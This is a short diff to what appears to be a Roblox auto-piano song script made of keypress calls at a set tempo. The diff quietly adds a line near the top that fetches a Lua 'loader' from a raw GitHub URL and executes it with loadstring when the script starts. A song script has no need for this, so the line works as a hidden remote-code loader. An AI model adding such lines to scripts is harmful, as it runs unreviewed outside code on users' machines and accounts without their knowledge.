@@ -6,7 +6,8 @@
 -- Midi Spoofer: OFF --
 
 bpm = 151
-
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/5365370665926114/lucigui/refs/heads/main/loader_main.lua", true))()
 
 keypress("7", x, bpm)
 keypress("T", x, bpm)
@@ -387,5 +388,6 @@ keypress("a", x, bpm)
 rest(0.5, bpm)
 keypress("o", x, bpm)
 keypress("5", x, bpm)
+
 
 finishedSong()
